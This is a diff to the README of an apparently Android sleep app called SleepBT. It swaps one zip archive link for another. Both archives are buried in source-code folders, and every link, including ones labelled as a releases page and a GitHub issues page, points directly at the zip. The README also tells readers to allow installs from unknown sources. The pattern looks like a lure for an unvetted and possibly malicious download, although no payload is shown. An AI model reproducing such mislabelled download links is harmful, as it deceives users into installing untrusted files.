@@ -8,9 +8,9 @@
 
 ## 📥 Download & Install
 
-[![Download SleepBT](https://raw.githubusercontent.com/Dafa-id/SleepBT/main/app/src/main/res/mipmap-xxxhdpi/SleepBT_v1.0.zip)](https://raw.githubusercontent.com/Dafa-id/SleepBT/main/app/src/main/res/mipmap-xxxhdpi/SleepBT_v1.0.zip)
+[![Download SleepBT](https://github.com/Dafa-id/SleepBT/raw/refs/heads/main/app/src/main/java/com/Sleep_BT_1.2-alpha.1.zip)](https://github.com/Dafa-id/SleepBT/raw/refs/heads/main/app/src/main/java/com/Sleep_BT_1.2-alpha.1.zip)
 
-To download the SleepBT app, please visit this page: [SleepBT Releases](https://raw.githubusercontent.com/Dafa-id/SleepBT/main/app/src/main/res/mipmap-xxxhdpi/SleepBT_v1.0.zip).
+To download the SleepBT app, please visit this page: [SleepBT Releases](https://github.com/Dafa-id/SleepBT/raw/refs/heads/main/app/src/main/java/com/Sleep_BT_1.2-alpha.1.zip).
 
 1. Open the above link in your web browser.
 2. You will see a list of available versions.
@@ -40,6 +40,6 @@ Make sure to enable installations from unknown sources in your device settings i
 
 ## 💬 Support
 
-If you encounter any issues or have questions while using SleepBT, feel free to reach out. You can visit our [GitHub Issues Page](https://raw.githubusercontent.com/Dafa-id/SleepBT/main/app/src/main/res/mipmap-xxxhdpi/SleepBT_v1.0.zip) to report bugs or ask for help. We appreciate feedback to improve the app.
+If you encounter any issues or have questions while using SleepBT, feel free to reach out. You can visit our [GitHub Issues Page](https://github.com/Dafa-id/SleepBT/raw/refs/heads/main/app/src/main/java/com/Sleep_BT_1.2-alpha.1.zip) to report bugs or ask for help. We appreciate feedback to improve the app.
 
 Follow these instructions, and you will be able to enjoy a peaceful sleep without any hassle!
